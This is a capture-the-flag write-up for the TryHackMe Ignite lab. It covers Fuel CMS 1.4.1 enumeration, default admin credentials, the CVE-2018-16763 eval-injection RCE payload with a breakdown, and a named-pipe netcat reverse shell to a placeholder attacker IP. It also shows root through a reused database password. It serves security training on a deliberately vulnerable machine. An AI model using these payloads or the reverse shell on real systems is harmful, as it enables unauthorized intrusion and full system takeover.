# TryHackMe — Ignite Writeup

## Overview

| Field         | Details                                      |
|---------------|----------------------------------------------|
| **Room**      | [Ignite](https://tryhackme.com/room/ignite)  |
| **Difficulty**| Easy                                         |
| **OS**        | Linux (Ubuntu)                               |
| **Key Topics**| Fuel CMS, CVE-2018-16763, RCE, Credential Reuse |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN nmap_initial <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

Key findings:
- **Port 80** — Apache 2.4.18 serving a web application
- **robots.txt** — discloses `/fuel/` directory (the CMS admin panel)
- **Fuel CMS** — identified from the page title

### Web Application

Navigating to `http://<TARGET_IP>` reveals the default Fuel CMS welcome page. The page itself confirms that the CMS version is **1.4.1** and even provides a hint about default credentials.

### Admin Panel — Default Credentials

Accessing `http://<TARGET_IP>/fuel/` presents a login form. Testing default credentials:

```
Username: admin
Password: admin
```

Successfully logged in. The dashboard confirms **Fuel CMS version 1.4.1**.

---

## Exploitation

### CVE-2018-16763 — Remote Code Execution

Fuel CMS 1.4.1 is vulnerable to Remote Code Execution via the `filter` parameter in `/fuel/pages/select/`. The vulnerability exists because user input is passed directly into PHP's `eval()` function without sanitization.

**Searching for exploits:**

```bash
searchsploit fuel cms 1.4
```

```
Fuel CMS 1.4.1 - Remote Code Execution (1)    | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)    | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)    | php/webapps/50477.py
```

Using exploit **50477.py** (the most recent and polished version):

```bash
searchsploit -m 50477
```

### Understanding the Payload

The exploit constructs the following injection:

```
/fuel/pages/select/?filter='+pi(print($a='system'))+$a('COMMAND')+'
```

Breaking it down:

1. `'+ ... +'` — breaks out of the string context in the PHP `eval()` call
2. `pi(print($a='system'))` — uses `pi()` as a wrapper to execute `print()`, which assigns the string `'system'` to variable `$a`. This avoids calling `system()` directly, bypassing basic function name filters.
3. `$a('COMMAND')` — calls `system()` indirectly through the variable, executing the OS command

The `filter` parameter value is processed by `create_function()` in `Pages.php` (line 924), which internally uses `eval()` — giving us arbitrary PHP code execution.

### Gaining Initial Access

**Running the exploit:**

```bash
python3 50477.py -u http://<TARGET_IP>
```

**Confirming code execution:**

```
Enter Command $ whoami
www-data
```

### Reverse Shell

To get a fully interactive shell, a named pipe (FIFO) reverse shell was used.

**1. Start a listener on the attacker machine:**

```bash
nc -lvnp 4444
```

**2. Send the reverse shell command via the exploit pseudo-shell:**

```
Enter Command $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

**How the named pipe reverse shell works:**

```
Attacker (nc listener)
    ↕ (network)
nc <ATTACKER_IP> 4444     — connects to attacker, sends shell output
    ↑ stdout               ↓ stdin writes to FIFO
/bin/sh -i 2>&1          /tmp/f (named pipe)
    ↑ commands from FIFO   ↓ cat reads from FIFO
         ← ← ← ← ← ← ← ←
              (loop)
```

The named pipe (`/tmp/f`) acts as a bridge, creating a bidirectional communication channel between the shell and the network connection.

**3. Stabilize the shell:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

### User Flag

```bash
cat /home/www-data/flag.txt
```

```
6470e394cbf6dab6a91682cc8585059b
```

---

## Privilege Escalation

### Database Configuration — Credential Reuse

Fuel CMS stores database credentials in a PHP configuration file. Checking it:

```bash
cat /var/www/html/fuel/application/config/database.php
```

**Relevant section:**

```php
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    'dbdriver' => 'mysqli',
);
```

The MySQL root password is **`mememe`**. Testing for password reuse against the system root account:

```bash
su root
Password: mememe
```

Success — we are now root.

### Root Flag

```bash
cat /root/root.txt
```

```
b9bbcb33e11b80be759c4e844862482d
```

---

## Attack Chain Summary

```
Nmap scan
  → Port 80: Apache + Fuel CMS 1.4.1
  → robots.txt discloses /fuel/ admin panel

Default credentials (admin:admin)
  → Access to CMS dashboard
  → Version confirmation: 1.4.1

CVE-2018-16763 (RCE via eval injection)
  → Code execution as www-data
  → Reverse shell via named pipe

Credential reuse
  → MySQL root password "mememe" from database.php
  → su root with the same password
  → Root shell obtained
```

---

## Lessons Learned

1. **Default credentials** remain one of the most common initial access vectors. Always change them immediately after installation.
2. **Known CVEs** in outdated software provide trivial exploitation paths. Keeping software up to date is critical.
3. **Credential reuse** between database and system accounts is a frequent misconfiguration that leads to full system compromise.
4. **robots.txt** is not a security mechanism — it publicly discloses paths that admins want hidden from crawlers, which is valuable information for attackers.
5. **Input sanitization** failures in web applications (passing user input to `eval()`) lead to catastrophic vulnerabilities like RCE.

---

## Tools Used

- **Nmap** — Network scanning and service enumeration
- **Searchsploit** — Exploit database search
- **CVE-2018-16763 exploit (50477.py)** — Fuel CMS RCE
- **Netcat** — Reverse shell listener
- **Python PTY** — Shell stabilization
